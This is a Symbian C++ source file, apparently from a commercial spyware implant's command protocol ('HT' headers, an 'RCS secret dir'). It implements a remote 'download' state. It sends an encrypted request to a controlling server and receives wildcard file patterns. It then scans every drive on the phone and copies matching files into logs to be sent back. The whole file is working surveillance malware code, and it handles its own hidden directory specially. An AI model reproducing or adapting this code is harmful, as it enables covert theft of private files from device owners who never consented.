/*
 * StateDownload.cpp
 *
 *  Created on: 23/feb/2011
 *      Author: Giovanna
 */

#include "StateDownload.h"

#include "Keys.h"
#include "AdditionalDataStructs.h"
#include <HT\LogFile.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include <HT\FileUtils.h>



CStateDownload::CStateDownload(MStateObserver& aObserver) : CAbstractState(EState_Download, aObserver)
	{
	// No implementation required
	}

CStateDownload::~CStateDownload()
	{
	delete iRequestData;
	delete iResponseData;
	delete iLongTask;
	iFilesArray->Reset();   //TODO: maybe move somewhere else?
	delete iFilesArray;
	iFs.Close();
	}

CStateDownload* CStateDownload::NewLC(MStateObserver& aObserver)
	{
	CStateDownload* self = new (ELeave) CStateDownload(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateDownload* CStateDownload::NewL(MStateObserver& aObserver)
	{
	CStateDownload* self = CStateDownload::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateDownload::ConstructL()
	{
	iLongTask = CLongTaskAO::NewL(*this);
	iFilesArray = new (ELeave) CDesCArrayFlat(5);  //5=granularity
	iFs.Connect();
	
	FileUtils::CompleteWithPrivatePathL(iFs, iPrivatePath);
	}

void CStateDownload::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
		
	TBuf8<32> plainBody;
	//append command
	plainBody.Copy(KProto_Download);
	//calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt 
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	//send
	iObserver.SendStateDataL(*iRequestData);
	}

void CStateDownload::ProcessDataL(const TDesC8& aData) 
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
		
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check the result of allocation
			iResponseData->Des().Append(aData);
			}
			return;
		}
			
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
			
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
		
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		FindFilesL(plainBody.Right(plainBody.Size()-8),iFilesArray);  //8=KProto_Ok|len
		}
	CleanupStack::PopAndDestroy(&plainBody);
	if(iFilesArray->Count()>0)
		{
		iFileIndex = 0;
		iLongTask->NextRound();
		}
	else
		iObserver.ChangeStateL();    
	}


TBool CStateDownload::MalformedPath(const TDesC& aPath)
	{
	_LIT(KErr1,".\\");      //this is usually a typo, e.g "E.\" instead of "E:\"
	_LIT(KErr2,"\\*\\");    //this is simply a stupid request, as in "\*\"
	
	if((aPath.FindF(KErr1) != KErrNotFound) || (aPath.FindF(KErr2) != KErrNotFound))
		return ETrue;
	else
		return EFalse;
	}

void CStateDownload::FindFilesL(const TDesC8& aFileList,CDesCArrayFlat* aFilesArray)
	{
	//retrieve the num of required files
	TUint8* ptr = (TUint8 *)aFileList.Ptr();
	TUint32 numFiles = 0;   				
	Mem::Copy(&numFiles, ptr, 4);
	ptr += sizeof(TUint32); 			
	
	for(TInt i=0; i<numFiles; i++)
		{
		//retrieve search-string len
		TUint32 len = 0;
		Mem::Copy(&len,ptr,4);
		ptr += sizeof(TUint32);
		//retrieve search string
		HBufC* searchString = HBufC::NewL(len);
		if (len > 0)
			{
			TUint8 totChars = (len-2) / 2;
			TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
			searchString->Des().Append(ptrNum);
			//check string, check typo errors like "E.\" or stupid requests such as "\*\"
			if(!MalformedPath(*searchString))
				{
				StartScanL(iFs,*searchString,aFilesArray);
				}
			}
		delete searchString;
		ptr += len;
		}
	}


//TFindFile and CFileMan classes support the use of wildcard characters. 
//An asterisk indicates any number of characters, and a question mark indicates a single character. 
//Note that in the context of these classes, * and *.* are equivalent and match to all files, 
//with and without extensions. Filename matching is case insensitive.
void CStateDownload::StartScanL(RFs& aFs,const TDesC& aSearchString, CDesCArray* aFileArray)
	{
	//retrieve all drives in mobile
	_LIT(KFormat,"%c:\\");
	TDriveList driveList;
	TInt err = aFs.DriveList(driveList);
	if(err != KErrNone)
		return;
	for(TInt driveNumber=EDriveA; driveNumber<=EDriveZ; driveNumber++)
		{
		if (driveList[driveNumber]) /** now we iterate through all the available drives */
			{
			TChar driveLetter;
			err = aFs.DriveToChar(driveNumber,driveLetter);
			TBuf<8> buf;
			buf.Format(KFormat,(TUint)driveLetter);
	
			CDirScan* dirScan = CDirScan::NewLC(aFs);
			dirScan->SetScanDataL(buf, KEntryAttDir|KEntryAttMatchExclusive, ESortNone, CDirScan::EScanDownTree);
			while(1)
				{
				CDir* dir = NULL;
				TRAPD(err, dirScan->NextL(dir));
				if(err == KErrPermissionDenied)  //we could'nt have the required capab
					{
					delete dir;
					continue;
					}
				if (dir == NULL) //there are no more directory to iterate
					{
					break;
					}
				delete dir;
				ScanDirectory(aFs, dirScan->FullPath(), aSearchString, aFileArray);
				}
			CleanupStack::PopAndDestroy(dirScan);
			}
		}
	}

void CStateDownload::ScanDirectory(RFs& aFs, const TDesC& aDir, const TDesC& aWild, CDesCArray* aFilesArray)
	{
	TParse parse;
	parse.Set(aWild, &aDir, NULL);
	TPtrC spec(parse.FullName());
	 
	TFindFile FindFile(aFs);
	CDir* dir;
	 
	if (FindFile.FindWildByPath(parse.FullName(), NULL, dir) == KErrNone)
		{
	    CleanupStack::PushL(dir);
	 
	    TInt count=dir->Count();
	    for(TInt i = 0; i < count; i++)
	    	{
	        parse.Set((*dir)[i].iName, &spec, NULL);
	        TEntry entry;
	        if(aFs.Entry(parse.FullName(),entry) == KErrNone)
	        	{
	        	if(!entry.IsDir())
	        		{
	        		//InsertIsqL raises a KErrAlreadyExists (-11) when inserting a duplicate
	        		TRAPD(err,aFilesArray->InsertIsqL(parse.FullName())); 
	        		}
	        	}
	        }
	    CleanupStack::PopAndDestroy(dir);
	    }
	}

void CStateDownload::DumpFileL(const TDesC& aFileName)
	{
	_LIT(KNull,"\x00");
	_LIT(KDir,"$dir$");
	TDownloadAdditionalData additionalData;
		
	//check if file it's inside RCS secret dir
	TParsePtrC parsePtrC(aFileName);
	
	if(iPrivatePath.CompareF(parsePtrC.DriveAndPath())==0)
		{
		//the file is in the private dir, we have to modify the path
		additionalData.fileName.Copy(KDir);
		additionalData.fileName.Append(parsePtrC.NameAndExt());
		additionalData.fileName.Append(KNull);  //add NULL terminator
		additionalData.uFileNamelen = additionalData.fileName.Size();
		}
	else
		{
		additionalData.fileName.Copy(aFileName);   
		additionalData.fileName.Append(KNull);	//add NULL terminator  
		additionalData.uFileNamelen = additionalData.fileName.Size();
		}
	
	RBuf8 fileBuf(FileUtils::ReadFileContentsL(iFs, aFileName));
	if(fileBuf.Size()>0)
		{
		fileBuf.CleanupClosePushL();
		CLogFile* logFile = CLogFile::NewLC(iFs);
		logFile->CreateLogL(LOGTYPE_DOWNLOAD, &additionalData);
		logFile->AppendLogL(fileBuf);    
		logFile->CloseLogL();
		CleanupStack::PopAndDestroy(logFile);
		CleanupStack::PopAndDestroy(&fileBuf);
		}
	else 
		{
		//something went wrong, usually a KErrNoMemory has been raised
		_LIT(KDownloadError,"Error in downloading file");
		CBufBase* buffer = CBufFlat::NewL(50);
		CleanupStack::PushL(buffer);
		buffer->InsertL(buffer->Size(),(TUint8*)KDownloadError().Ptr(),KDownloadError().Size());
		HBufC8* byteBuf = buffer->Ptr(0).AllocLC();
		CLogFile* logFile = CLogFile::NewLC(iFs);
		logFile->CreateLogL(LOGTYPE_INFO);
		logFile->AppendLogL(*byteBuf);
		logFile->CloseLogL();
		CleanupStack::PopAndDestroy(logFile);
		CleanupStack::PopAndDestroy(byteBuf);
		CleanupStack::PopAndDestroy(buffer);
		}
	}




void CStateDownload::DoOneRoundL()
	{
	if (iStopLongTask)
		{
		iObserver.ChangeStateL();
		return;
		}
	if(iFileIndex < iFilesArray->Count())
		{
		DumpFileL(iFilesArray->MdcaPoint(iFileIndex));
		iFileIndex++;
		iLongTask->NextRound();
		}
	else
		iObserver.ChangeStateL();
	}
